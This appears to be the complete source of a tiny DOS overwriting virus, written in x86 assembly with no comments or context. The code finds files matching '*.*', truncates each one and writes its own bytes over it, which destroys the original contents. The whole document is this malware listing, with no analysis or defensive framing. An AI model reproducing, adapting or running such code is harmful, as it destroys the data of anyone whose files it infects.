Main:           Mov Ah,4eh
                Lea Dx,FileSpec
                Int 21h
                Mov Ah,3ch
                Mov Dx,9eh
On2:            Int 21h
                Mov Dl,Length
FileSpec        Db '*.*',0
                Mov Bh,40h
                Xchg Cx,Dx
                Xchg Ax,Bx
                Jmp On2
Length          Equ $-Main
